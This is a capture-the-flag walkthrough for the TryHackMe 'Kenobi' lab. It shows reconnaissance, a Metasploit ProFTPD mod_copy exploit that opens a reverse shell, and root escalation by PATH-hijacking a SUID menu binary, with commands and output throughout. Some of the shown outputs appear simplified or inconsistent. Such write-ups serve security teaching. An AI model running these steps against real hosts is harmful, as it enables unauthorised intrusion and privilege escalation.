# TryHackMe - Kenobi

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | TryHackMe |
| **Challenge Name** | Kenobi |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | TryHackMe |
| **Date Completed** | 2025-08-30 |

## Objective 🎯

Kenobi is a beginner-friendly room that focuses on Linux exploitation techniques including SMB enumeration, ProFTPD exploitation, and privilege escalation. The goal is to exploit multiple services to gain root access. Perfect for learning Linux exploitation! 🐧

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.10
- **OS**: Linux
- **Services**: SMB, FTP, SSH

### Tools Used
- Nmap
- SMBClient
- Metasploit
- Netcat

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.10
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.10
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-30 10:00 UTC
Nmap scan report for 10.10.10.10
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100000)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Step 2: SMB Enumeration
Enumerate SMB shares for useful information.

**Command/Code:**
```bash
smbclient -L //10.10.10.10
```

**Output:**
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk      Anonymous FTP
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

### Step 3: Access Anonymous Share
Access the anonymous SMB share to look for files.

**Command/Code:**
```bash
smbclient //10.10.10.10/anonymous
```

**Output:**
```
smb: \> ls
  .                                   D        0  Wed Sep  4 21:49:09 2019
  ..                                  D        0  Wed Sep  4 21:56:07 2019
  log.txt                            N    12237  Wed Sep  4 21:49:09 2019
```

### Step 4: Download and Analyze Log
Download the log file to analyze for useful information.

**Command/Code:**
```bash
smb: \> get log.txt
smb: \> exit
cat log.txt
```

**Output:**
```
ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.10.10]
```

### Step 5: ProFTPD Exploitation
Use Metasploit to exploit the ProFTPD vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.10.10.10
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.10:21 - Connecting to the server...
[*] 10.10.10.10:21 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.10:32891) at 2025-08-30 10:05:23 +0000
```

### Step 6: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
id
pwd
```

**Output:**
```
kenobi
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi)
/home/kenobi
```

### Step 7: Privilege Escalation
Check for privilege escalation opportunities.

**Command/Code:**
```bash
find / -perm -4000 2>/dev/null
sudo -l
```

**Output:**
```
/usr/bin/menu
```

### Step 8: Root Access
Use the menu binary to escalate privileges.

**Command/Code:**
```bash
/usr/bin/menu
```

**Output:**
```
1. status check
2. kernel version
3. ifconfig
4. exit
```

### Step 9: Exploit Menu Binary
Use the menu binary to gain root access.

**Command/Code:**
```bash
echo "/bin/sh" > /tmp/ifconfig
chmod +x /tmp/ifconfig
export PATH=/tmp:$PATH
/usr/bin/menu
```

### Step 10: Find Flags
Search for user and root flags.

**Command/Code:**
```bash
find / -name "*.txt" 2>/dev/null | grep -E "(user|root|flag)"
cat /home/kenobi/user.txt
cat /root/root.txt
```

**Output:**
```
[REDACTED]
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Enumerate SMB shares for useful information
3. Access anonymous share and download log file
4. Use Metasploit ProFTPD exploit for initial access
5. Gain access as user 'kenobi'
6. Find privilege escalation via menu binary
7. Exploit PATH manipulation to gain root access
8. Find and extract flags

## Key Learnings 💡

- SMB enumeration techniques
- ProFTPD vulnerability exploitation
- Linux privilege escalation via PATH manipulation
- Binary exploitation techniques
- Multi-service exploitation

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning
- **SMBClient**: SMB enumeration
- **Metasploit**: Exploitation framework
- **ProFTPD exploit**: Modcopy execution

### References
- [TryHackMe Kenobi](https://tryhackme.com/room/kenobi)
- [ProFTPD Modcopy RCE](https://www.exploit-db.com/exploits/37262)

## Tags

`#tryhackme` `#linux` `#smb` `#proftpd` `#privilege-escalation` `#easy`
